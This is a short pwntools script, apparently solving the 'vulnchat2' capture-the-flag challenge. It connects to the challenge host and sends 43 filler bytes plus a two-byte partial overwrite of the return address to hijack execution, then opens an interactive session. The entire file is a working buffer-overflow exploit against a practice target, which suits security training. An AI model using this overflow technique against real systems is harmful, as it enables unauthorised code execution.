from pwn import *

r = remote('vulnchat2.tuctf.com', 4242)

r.sendline('aaa')
sleep(1)
r.send('a'*43 + "\x72\x86")

r.interactive()
